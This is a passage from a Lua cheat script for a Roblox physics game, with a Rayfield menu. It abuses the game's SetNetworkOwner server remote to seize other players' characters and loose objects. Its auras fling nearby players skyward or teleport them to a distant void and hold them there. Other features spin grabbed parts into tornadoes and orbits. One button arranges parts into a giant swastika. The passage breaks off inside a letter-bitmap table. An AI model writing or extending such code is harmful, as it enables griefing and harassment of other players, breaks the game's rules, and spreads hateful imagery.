AuraTab:CreateSlider({ Name = "Height", Range = {1,10000}, Increment = 1, Suffix = "Height", CurrentValue = TornadoHeight, Flag = "AuraHeight", Callback = function(v) TornadoHeight = v end })
AuraTab:CreateSlider({ Name = "Rotation Speed", Range = {0.01,1}, Increment = 0.001, Suffix = "Speed", CurrentValue = TornadoSpeed, Flag = "AuraSpeed", Callback = function(v) TornadoSpeed = v end })

-- Air Suspend Aura
local auraSpeed = 50
local auraBodies, auraCoroutine = {}, nil
AuraTab:CreateSection("Air Aura")
AuraTab:CreateToggle({
    Name = 'Air Suspend Aura     <font face="GothamBlack" color="rgb(7,255,0)">fly!</font>',
    CurrentValue = false,
    Flag = "AirSuspendAura",
    Callback = function(enabled)
        if enabled then
            auraCoroutine = coroutine.create(function()
                while task.wait(0.02) do
                    local c = LocalPlayer.Character
                    local hrp = c and c:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= LocalPlayer and player.Character then
                                local root = player.Character:FindFirstChild("Torso") or player.Character:FindFirstChild("HumanoidRootPart")
                                if root then
                                    local bv = auraBodies[player]
                                    if not bv or not bv.Parent then
                                        bv = Instance.new("BodyVelocity")
                                        bv.Name = "AirSuspendBV"
                                        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        bv.Parent = root
                                        auraBodies[player] = bv
                                    end
                                    bv.Velocity = Vector3.new(0, auraSpeed, 0)
                                    pcall(function() SetNetworkOwner:FireServer(root, root.CFrame) end)
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(auraCoroutine)
        else
            if auraCoroutine then coroutine.close(auraCoroutine) auraCoroutine = nil end
            for _, bv in pairs(auraBodies) do if bv and bv.Parent then bv:Destroy() end end
            auraBodies = {}
        end
    end
})
AuraTab:CreateInput({ Name = "Speed", CurrentValue = tostring(auraSpeed), PlaceholderText = "Enter speed (-100 to 500)", RemoveTextAfterFocusLost = false, Flag = "AirSuspendSpeed", Callback = function(text) local v = tonumber(text) if v then auraSpeed = v end end })

AuraTab:CreateSection("Teleport Aura")
local teleportAuraEnabled, teleportTarget = false, "Cursed Cloud"
local teleportBodies, teleportGyros, teleportCoroutine = {}, {}, nil
AuraTab:CreateToggle({
    Name = 'Enable Teleport Aura		 <font face="GothamBlack" color="rgb(7,255,0)">teleport them</font>',
    CurrentValue = false,
    Flag = "TeleportAura",
    Callback = function(enabled)
        teleportAuraEnabled = enabled
        if enabled then
            teleportCoroutine = coroutine.create(function()
                while task.wait(0.05) do
                    local character = LocalPlayer.Character
                    local hrp = character and character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= LocalPlayer and player.Character then
                                local root = player.Character:FindFirstChild("HumanoidRootPart")
                                if root and (hrp.Position - root.Position).Magnitude <= 30 then
                                    pcall(function() SetNetworkOwner:FireServer(root, root.CFrame) end)
                                    local targetPos = Vector3.new(0,0,0)
                                    if teleportTarget == "Cursed Cloud" then
                                        targetPos = Vector3.new(900000, 100, 3000)
                                    elseif teleportTarget == "Spawn" then
                                        targetPos = Vector3.new(0,0,0)
                                    elseif teleportTarget == "Void" then
                                        targetPos = Vector3.new(0, 1e12, 0)
                                    end
                                    root.CFrame = CFrame.new(targetPos)
                                    if teleportBodies[player] and teleportBodies[player].Parent then teleportBodies[player]:Destroy() end
                                    local bp = Instance.new("BodyPosition")
                                    bp.Name = "TeleportAuraBP"
                                    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    bp.P = 50000
                                    bp.D = 1250
                                    bp.Position = targetPos
                                    bp.Parent = root
                                    teleportBodies[player] = bp
                                    if teleportGyros[player] and teleportGyros[player].Parent then teleportGyros[player]:Destroy() end
                                    local bg = Instance.new("BodyGyro")
                                    bg.Name = "TeleportAuraBG"
                                    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                                    bg.CFrame = root.CFrame
                                    bg.Parent = root
                                    teleportGyros[player] = bg
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(teleportCoroutine)
        else
            if teleportCoroutine then coroutine.close(teleportCoroutine) teleportCoroutine = nil end
            for _, bp in pairs(teleportBodies) do if bp and bp.Parent then bp:Destroy() end end
            for _, bg in pairs(teleportGyros) do if bg and bg.Parent then bg:Destroy() end end
            teleportBodies, teleportGyros = {}, {}
        end
    end
})
AuraTab:CreateDropdown({ Name = "Teleport Location", Options = {"Cursed Cloud", "Spawn", "Void"}, CurrentOption = {"Cursed Cloud"}, Flag = "TeleportAuraLocation", Callback = function(option) teleportTarget = option[1] end })



ToyTab:CreateSection("Fun")

TornadoTrackedParts = {}
TornadoFloatLoops = {}
TornadoGravityConnection = nil

TornadoCONFIG = { AURA_RADIUS = 30, SCAN_DELAY = 0.1, PER_PART_THROTTLE = 0.2 }
TornadorecentParts = {}
TornadoownedParts = {}
TornadoauraRunning = false
TornadoscanTask = nil

function TornadoStopFloat(part)
    if TornadoFloatLoops[part] then pcall(function() TornadoFloatLoops[part]:Disconnect() end) TornadoFloatLoops[part] = nil end
    bv = part:FindFirstChildOfClass("BodyVelocity")
    if bv then bv:Destroy() end
    bav = part:FindFirstChildOfClass("BodyAngularVelocity")
    if bav then bav:Destroy() end
end

function TornadoisPlayerPart(part)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character and part:IsDescendantOf(plr.Character) then return true end
    end
    return false
end

function TornadoisOwned(part)
    owner = part:FindFirstChild("PartOwner")
    return owner and owner.Value == LocalPlayer.Name
end

function TornadoclaimPartOwner(part)
    if SetNetworkOwner then pcall(function() SetNetworkOwner:FireServer(part, part.CFrame) end) end
    if not TornadoTrackedParts[part] then
        bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1e5, 0, 1e5)
        bv.Velocity = Vector3.zero
        TornadoTrackedParts[part] = {bv = bv, bav = bav}
        part.AncestryChanged:Connect(function(_, parent)
            if not parent then TornadoStopFloat(part) TornadoTrackedParts[part] = nil end
        end)
    end
end

function TornadocleanupOwnedParts()
    for part in pairs(TornadoownedParts) do TornadoStopFloat(part) end
    table.clear(TornadoownedParts)
    table.clear(TornadorecentParts)
end

function TornadostartScanner()
    if TornadoscanTask then return end
    TornadoscanTask = task.spawn(function()
        while TornadoauraRunning do
            char = LocalPlayer.Character
            if char and char.PrimaryPart then
                rootPos = char.PrimaryPart.Position
                parts = Workspace:GetPartBoundsInRadius(rootPos, TornadoCONFIG.AURA_RADIUS)
                now = tick()
                for _, part in ipairs(parts) do
                    if part:IsA("BasePart") and not part.Anchored and not TornadoisPlayerPart(part) then
                        model = part:FindFirstAncestorWhichIsA("Model")
                        if model then
                            ownedAlready = false
                            for _, p in ipairs(model:GetDescendants()) do
                                if p:IsA("BasePart") and TornadoisOwned(p) then ownedAlready = true break end
                            end
                            if not ownedAlready then
                                last = TornadorecentParts[part]
                                if (not last) or (now - last > TornadoCONFIG.PER_PART_THROTTLE) then
                                    TornadorecentParts[part] = now
                                    TornadoclaimPartOwner(part)
                                end
                            end
                            for _, p in ipairs(model:GetDescendants()) do
                                if p:IsA("BasePart") and TornadoisOwned(p) then TornadoownedParts[p] = true end
                            end
                        end
                    end
                end
            end
            task.wait(TornadoCONFIG.SCAN_DELAY)
        end
    end)
end

function TornadostopScanner()
    TornadoauraRunning = false
    TornadoscanTask = nil
end

ToyTab:CreateToggle({
    Name = "Aura (Disable when using something!)",
    CurrentValue = false,
    Flag = "TornadoAuraToggle",
    Callback = function(enabled)
        if enabled then
            TornadoauraRunning = true
            TornadostartScanner()
            Rayfield:Notify({ Title = "Aura Grab", Content = "Started", Duration = 2 })
        else
            TornadostopScanner()
            TornadocleanupOwnedParts()
            Rayfield:Notify({ Title = "Aura Grab", Content = "Stopped", Duration = 2 })
        end
    end
})

HollowPurpleSettings = {
    OrbDistance = 80,
    OrbOffset = 80,
    Height = 5,
    PosX = 0,
    PosY = 0,
    PosZ = 0
}

ToyTab:CreateSection("Hollow Purple Settings")

ToyTab:CreateSlider({
    Name = "Orb Distance",
    Range = {10, 200},
    Increment = 5,
    CurrentValue = 80,
    Flag = "HollowPurpleDistance",
    Callback = function(Value)
        HollowPurpleSettings.OrbDistance = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Orb Offset",
    Range = {10, 200},
    Increment = 5,
    CurrentValue = 80,
    Flag = "HollowPurpleOffset",
    Callback = function(Value)
        HollowPurpleSettings.OrbOffset = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Height",
    Range = {0, 50},
    Increment = 1,
    CurrentValue = 5,
    Flag = "HollowPurpleHeight",
    Callback = function(Value)
        HollowPurpleSettings.Height = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position X",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "HollowPurplePosX",
    Callback = function(Value)
        HollowPurpleSettings.PosX = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Y",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "HollowPurplePosY",
    Callback = function(Value)
        HollowPurpleSettings.PosY = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Z",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "HollowPurplePosZ",
    Callback = function(Value)
        HollowPurpleSettings.PosZ = Value
    end,
})

ToyTab:CreateButton({
    Name = "Hollow Purple...",
    Callback = function()
        char = LocalPlayer.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
        root = char.HumanoidRootPart
        forward = root.CFrame.LookVector
        right = root.CFrame.RightVector
        basePos = Vector3.new(HollowPurpleSettings.PosX, HollowPurpleSettings.PosY, HollowPurpleSettings.PosZ)
        leftOrbPos = basePos + root.Position + forward * HollowPurpleSettings.OrbDistance - right * HollowPurpleSettings.OrbOffset + Vector3.new(0, HollowPurpleSettings.Height, 0)
        rightOrbPos = basePos + root.Position + forward * HollowPurpleSettings.OrbDistance + right * HollowPurpleSettings.OrbOffset + Vector3.new(0, HollowPurpleSettings.Height, 0)
        centerOrbPos = basePos + root.Position + forward * HollowPurpleSettings.OrbDistance + Vector3.new(0, HollowPurpleSettings.Height, 0)
        GatheredParts = {}
        partsList = {}
        for part, _ in pairs(TornadoTrackedParts) do
            if part and part:IsDescendantOf(workspace) then TornadoStopFloat(part) table.insert(partsList, part) end
        end
        for i, part in ipairs(partsList) do
            orbTarget = (i % 2 == 0) and rightOrbPos or leftOrbPos
            bp = Instance.new("BodyPosition")
            bp.MaxForce = Vector3.new(1e6, 1e6, 1e6)
            bp.D = 1000
            bp.P = 20000
            bp.Position = orbTarget + Vector3.new(math.random(-3, 3), math.random(-2, 2), math.random(-3, 3))
            bp.Parent = part
            GatheredParts[part] = bp
        end
        task.delay(3, function()
            for part, bp in pairs(GatheredParts) do
                bp.Position = centerOrbPos + Vector3.new(math.random(-2, 2), math.random(-2, 2), math.random(-2, 2))
            end
            task.delay(2, function()
                for part, bp in pairs(GatheredParts) do
                    if bp and bp.Parent then bp:Destroy() end
                    blast = Instance.new("BodyVelocity")
                    blast.MaxForce = Vector3.new(1e6, 1e6, 1e6)
                    blast.Velocity = Vector3.new(math.random(-500, 500), math.random(-300, 300), math.random(-500, 500))
                    blast.Parent = part
                    Debris:AddItem(blast, 1)
                end
                table.clear(GatheredParts)
                table.clear(TornadoTrackedParts)
            end)
        end)
    end
})

SwastikaSettings = {
    Height = 250,
    Scale = 15,
    PosX = 0,
    PosY = 250,
    PosZ = 0
}

ToyTab:CreateSection("Swastika Settings")

ToyTab:CreateSlider({
    Name = "Scale",
    Range = {5, 50},
    Increment = 1,
    CurrentValue = 15,
    Flag = "SwastikaScale",
    Callback = function(Value)
        SwastikaSettings.Scale = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position X",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "SwastikaPosX",
    Callback = function(Value)
        SwastikaSettings.PosX = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Y",
    Range = {0, 500},
    Increment = 10,
    CurrentValue = 250,
    Flag = "SwastikaPosY",
    Callback = function(Value)
        SwastikaSettings.PosY = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Z",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "SwastikaPosZ",
    Callback = function(Value)
        SwastikaSettings.PosZ = Value
    end,
})

ToyTab:CreateButton({
    Name = "Swastika",
    Callback = function()
        basePos = Vector3.new(SwastikaSettings.PosX, SwastikaSettings.PosY, SwastikaSettings.PosZ)
        scale = SwastikaSettings.Scale
        CUSTOM_9x9 = {
            "100011111",
            "100010000",
            "100010000",
            "100010000",
            "111111111",
            "000010001",
            "000010001",
            "000010001",
            "111110001",
        }
        partsList = {}
        for part, _ in pairs(TornadoTrackedParts) do
            if part and part:IsDescendantOf(workspace) then TornadoStopFloat(part) table.insert(partsList, part) end
        end
        targetPositions = {}
        height = #CUSTOM_9x9
        width = #CUSTOM_9x9[1]
        for row = 1, height do
            line = CUSTOM_9x9[row]
            for col = 1, width do
                if line:sub(col, col) == "1" then
                    offset = Vector3.new((col - 1 - width / 2) * scale, 0, -(row - 1 - height / 2) * scale)
                    table.insert(targetPositions, basePos + offset)
                end
            end
        end
        if #partsList < #targetPositions then
            Rayfield:Notify({ Title = "Not Enough Pallets", Content = "You need at least " .. tostring(#targetPositions) .. " pallets for this symbol!", Duration = 4 })
        end
        for i, part in ipairs(partsList) do
            target = targetPositions[(i - 1) % #targetPositions + 1]
            bp = Instance.new("BodyPosition")
            bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bp.D = 1000
            bp.P = 50000
            bp.Position = target
            bp.Parent = part
        end
    end
})

TeleportSettings = {
    PosX = 0,
    PosY = 0,
    PosZ = 0
}

ToyTab:CreateSection("Teleport Settings")

ToyTab:CreateSlider({
    Name = "Position X",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "TeleportPosX",
    Callback = function(Value)
        TeleportSettings.PosX = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Y",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "TeleportPosY",
    Callback = function(Value)
        TeleportSettings.PosY = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Z",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "TeleportPosZ",
    Callback = function(Value)
        TeleportSettings.PosZ = Value
    end,
})

ToyTab:CreateButton({
    Name = "Teleport Parts To Point",
    Callback = function()
        targetPosition = Vector3.new(TeleportSettings.PosX, TeleportSettings.PosY, TeleportSettings.PosZ)
        partsList = {}
        for part, _ in pairs(TornadoTrackedParts) do
            if part and part:IsDescendantOf(workspace) then TornadoStopFloat(part) table.insert(partsList, part) end
        end
        if #partsList == 0 then return end
        for _, part in ipairs(partsList) do
            pcall(function() part.CFrame = CFrame.new(targetPosition) end)
        end
    end
})

OrbitSettings = {
    Radius = 50,
    Speed = 100,
    Height = 3
}

ToyTab:CreateSection("Orbit Settings")

ToyTab:CreateSlider({
    Name = "Radius",
    Range = {10, 200},
    Increment = 5,
    CurrentValue = 50,
    Flag = "OrbitRadius",
    Callback = function(Value)
        OrbitSettings.Radius = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Speed",
    Range = {10, 500},
    Increment = 10,
    CurrentValue = 100,
    Flag = "OrbitSpeed",
    Callback = function(Value)
        OrbitSettings.Speed = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Height Variation",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 3,
    Flag = "OrbitHeight",
    Callback = function(Value)
        OrbitSettings.Height = Value
    end,
})

ORBIT_RADIUS = 50
ORBIT_SPEED = math.rad(100)
orbitingParts = {}
orbitConnection = nil
orbitEnabled = false

function TornadostartOrbit()
    char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    root = char.HumanoidRootPart
    if orbitConnection then orbitConnection:Disconnect() end
    orbitingParts = {}
    for part, _ in pairs(TornadoTrackedParts) do
        if part and part:IsDescendantOf(workspace) then orbitingParts[part] = {angle = math.random() * 2 * math.pi} end
    end
    orbitConnection = RunService.Heartbeat:Connect(function(dt)
        time = tick()
        index = 0
        for part, data in pairs(orbitingParts) do
            if part and part.Parent then
                data.angle = data.angle + math.rad(OrbitSettings.Speed) * dt
                x = math.cos(data.angle) * OrbitSettings.Radius
                z = math.sin(data.angle) * OrbitSettings.Radius
                y = math.sin(time + index) * OrbitSettings.Height
                targetPos = root.Position + Vector3.new(x, y, z)
                if part:FindFirstChild("BodyPosition") then
                    part.BodyPosition.Position = targetPos
                else
                    bp = Instance.new("BodyPosition")
                    bp.MaxForce = Vector3.new(1e6, 1e6, 1e6)
                    bp.P = 5000
                    bp.D = 100
                    bp.Position = targetPos
                    bp.Parent = part
                end
                index = index + 1
            end
        end
    end)
end

function TornadostopOrbit()
    if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
    for part in pairs(orbitingParts) do
        if part and part:FindFirstChild("BodyPosition") then part.BodyPosition:Destroy() end
    end
    orbitingParts = {}
end

ToyTab:CreateToggle({
    Name = "Orbit",
    CurrentValue = false,
    Flag = "OrbitMeToggle",
    Callback = function(enabled)
        orbitEnabled = enabled
        if enabled then TornadostartOrbit() else TornadostopOrbit() end
    end
})

TornadoSettings = {
    Height = 200,
    Radius = 100,
    Speed = 200,
    PosX = 0,
    PosY = 0,
    PosZ = 0
}

ToyTab:CreateSection("Tornado Settings")

ToyTab:CreateSlider({
    Name = "Height",
    Range = {50, 500},
    Increment = 10,
    CurrentValue = 200,
    Flag = "TornadoHeight",
    Callback = function(Value)
        TornadoSettings.Height = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Radius",
    Range = {20, 300},
    Increment = 10,
    CurrentValue = 100,
    Flag = "TornadoRadius",
    Callback = function(Value)
        TornadoSettings.Radius = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Speed",
    Range = {50, 500},
    Increment = 10,
    CurrentValue = 200,
    Flag = "TornadoSpeed",
    Callback = function(Value)
        TornadoSettings.Speed = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position X",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "TornadoPosX",
    Callback = function(Value)
        TornadoSettings.PosX = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Y",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "TornadoPosY",
    Callback = function(Value)
        TornadoSettings.PosY = Value
    end,
})

ToyTab:CreateSlider({
    Name = "Position Z",
    Range = {-500, 500},
    Increment = 10,
    CurrentValue = 0,
    Flag = "TornadoPosZ",
    Callback = function(Value)
        TornadoSettings.PosZ = Value
    end,
})

TORNADO_HEIGHT = 200
TORNADO_BASE_RADIUS = 100
TORNADO_SPIN_SPEED = math.rad(200)
tornadoParts = {}
tornadoConnection = nil

function TornadostartTornado()
    center = Vector3.new(TornadoSettings.PosX, TornadoSettings.PosY, TornadoSettings.PosZ)
    if tornadoConnection then tornadoConnection:Disconnect() end
    tornadoParts = {}
    for part, _ in pairs(TornadoTrackedParts) do
        if part and part:IsDescendantOf(workspace) then tornadoParts[part] = {angle = math.random() * 2 * math.pi, heightOffset = math.random() * TornadoSettings.Height} end
    end
    tornadoConnection = RunService.Heartbeat:Connect(function(dt)
        for part, data in pairs(tornadoParts) do
            if part and part.Parent then
                data.angle = data.angle + math.rad(TornadoSettings.Speed) * dt
                t = data.heightOffset % TornadoSettings.Height
                radius = (t / TornadoSettings.Height) * TornadoSettings.Radius
                x = math.cos(data.angle) * radius
                z = math.sin(data.angle) * radius
                y = t
                targetPos = center + Vector3.new(x, y, z)
                if part:FindFirstChild("BodyPosition") then
                    part.BodyPosition.Position = targetPos
                else
                    bp = Instance.new("BodyPosition")
                    bp.MaxForce = Vector3.new(1e6, 1e6, 1e6)
                    bp.P = 5000
                    bp.D = 100
                    bp.Position = targetPos
                    bp.Parent = part
                end
                data.heightOffset = data.heightOffset + 50 * dt
            end
        end
    end)
end

function TornadostopTornado()
    if tornadoConnection then tornadoConnection:Disconnect() tornadoConnection = nil end
    for part in pairs(tornadoParts) do
        if part and part:FindFirstChild("BodyPosition") then part.BodyPosition:Destroy() end
    end
    tornadoParts = {}
end

ToyTab:CreateToggle({
    Name = "Tornado",
    CurrentValue = false,
    Flag = "TornadoToggle",
    Callback = function(enabled)
        if enabled then TornadostartTornado() else TornadostopTornado() end
    end
})

ToyTab:CreateSection("Text aura (only plots laddersbrown)")

TextAura_Players = game:GetService("Players")
TextAura_RunService = game:GetService("RunService")
TextAura_ReplicatedStorage = game:GetService("ReplicatedStorage")
TextAura_Workspace = game:GetService("Workspace")

TextAura_LocalPlayer = TextAura_Players.LocalPlayer
TextAura_GrabEvents = TextAura_ReplicatedStorage:WaitForChild("GrabEvents")
TextAura_SetNetworkOwner = TextAura_GrabEvents:WaitForChild("SetNetworkOwner")

TextAura_AURA_RADIUS = 30
TextAura_SCAN_DELAY = 0.1
TextAura_PER_PART_THROTTLE = 0.3
TextAura_TEXT_HEIGHT = 100
TextAura_TEXT_SCALE = 30
TextAura_TEXT_DISTANCE = 30
TextAura_AURA_ACTIVE = false
TextAura_CUSTOM_TEXT = "HI"

TextAura_recentParts = setmetatable({}, { __mode = "k" })
TextAura_activeParts = setmetatable({}, { __mode = "k" })
TextAura_textParts = {}
TextAura_textPositions = {}
TextAura_heartbeatConnection = nil
TextAura_scanLoop = nil
TextAura_textLabel = nil
TextAura_debugLabel = nil

TextAura_letterData = {
    ["A"] = {{0,0,1,1,1,0,0},{0,1,0,0,0,1,0},{1,0,0,0,0,0,1},{1,1,1,1,1,1,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1}},
    ["B"] = {{1,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,1,0},{1,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,1,0},{1,1,1,1,1,0,0}},
    ["C"] = {{0,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,1,0},{0,1,1,1,1,0,0}},
    ["D"] = {{1,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,1,0},{1,1,1,1,1,0,0}},
    ["E"] = {{1,1,1,1,1,1,1},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,1,1,1,1,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,1,1,1,1,1,1}},
    ["F"] = {{1,1,1,1,1,1,1},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,1,1,1,1,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0}},
    ["G"] = {{0,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,0,0},{1,0,0,1,1,1,1},{1,0,0,0,0,0,1},{1,0,0,0,0,1,0},{0,1,1,1,1,0,0}},
    ["H"] = {{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,1,1,1,1,1,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1}},
    ["I"] = {{1,1,1,1,1,1,1},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{1,1,1,1,1,1,1}},
    ["J"] = {{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
    ["K"] = {{1,0,0,0,0,1,0},{1,0,0,0,1,0,0},{1,0,0,1,0,0,0},{1,1,1,0,0,0,0},{1,0,0,1,0,0,0},{1,0,0,0,1,0,0},{1,0,0,0,0,1,0}},
    ["L"] = {{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,1,1,1,1,1,1}},
    ["M"] = {{1,0,0,0,0,0,1},{1,1,0,0,0,1,1},{1,0,1,0,1,0,1},{1,0,0,1,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1}},
    ["N"] = {{1,0,0,0,0,0,1},{1,1,0,0,0,0,1},{1,0,1,0,0,0,1},{1,0,0,1,0,0,1},{1,0,0,0,1,0,1},{1,0,0,0,0,1,1},{1,0,0,0,0,0,1}},
    ["O"] = {{0,1,1,1,1,1,0},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
    ["P"] = {{1,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,1,0},{1,1,1,1,1,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0}},
    ["Q"] = {{0,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,1,0},{1,0,0,0,0,1,0},{1,0,0,1,0,1,0},{1,0,0,0,1,0,0},{0,1,1,1,0,1,1}},
    ["R"] = {{1,1,1,1,1,0,0},{1,0,0,0,0,1,0},{1,0,0,0,0,1,0},{1,1,1,1,1,0,0},{1,0,0,1,0,0,0},{1,0,0,0,1,0,0},{1,0,0,0,0,1,0}},
    ["S"] = {{0,1,1,1,1,1,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{0,1,1,1,1,0,0},{0,0,0,0,0,1,0},{0,0,0,0,0,1,0},{1,1,1,1,1,0,0}},
    ["T"] = {{1,1,1,1,1,1,1},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0}},
    ["U"] = {{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
    ["V"] = {{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,0,0,0,1,0},{0,1,0,0,0,1,0},{0,0,1,1,1,0,0}},
    ["W"] = {{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,1,0,0,1},{1,0,1,0,1,0,1},{1,1,0,0,0,1,1},{1,0,0,0,0,0,1}},
    ["X"] = {{1,0,0,0,0,0,1},{0,1,0,0,0,1,0},{0,0,1,0,1,0,0},{0,0,0,1,0,0,0},{0,0,1,0,1,0,0},{0,1,0,0,0,1,0},{1,0,0,0,0,0,1}},
    ["Y"] = {{1,0,0,0,0,0,1},{0,1,0,0,0,1,0},{0,0,1,0,1,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0}},
    ["Z"] = {{1,1,1,1,1,1,1},{0,0,0,0,0,1,0},{0,0,0,0,1,0,0},{0,0,0,1,0,0,0},{0,0,1,0,0,0,0},{0,1,0,0,0,0,0},{1,1,1,1,1,1,1}},
    ["0"] = {{0,1,1,1,1,1,0},{1,0,0,0,0,0,1},{1,0,0,0,0,1,1},{1,0,0,0,1,0,1},{1,1,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
    ["1"] = {{0,0,0,1,0,0,0},{0,0,1,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,0,0,1,0,0,0},{0,1,1,1,1,1,0}},
    ["2"] = {{0,1,1,1,1,1,0},{1,0,0,0,0,0,1},{0,0,0,0,0,0,1},{0,0,0,0,0,1,0},{0,0,0,1,1,0,0},{0,1,1,0,0,0,0},{1,1,1,1,1,1,1}},
    ["3"] = {{1,1,1,1,1,1,0},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{0,1,1,1,1,1,0},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{1,1,1,1,1,1,0}},
    ["4"] = {{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{1,1,1,1,1,1,1},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1}},
    ["5"] = {{1,1,1,1,1,1,1},{1,0,0,0,0,0,0},{1,1,1,1,1,1,0},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
    ["6"] = {{0,1,1,1,1,1,0},{1,0,0,0,0,0,0},{1,0,0,0,0,0,0},{1,1,1,1,1,1,0},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
    ["7"] = {{1,1,1,1,1,1,1},{0,0,0,0,0,0,1},{0,0,0,0,0,1,0},{0,0,0,0,1,0,0},{0,0,0,1,0,0,0},{0,0,1,0,0,0,0},{0,1,0,0,0,0,0}},
    ["8"] = {{0,1,1,1,1,1,0},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
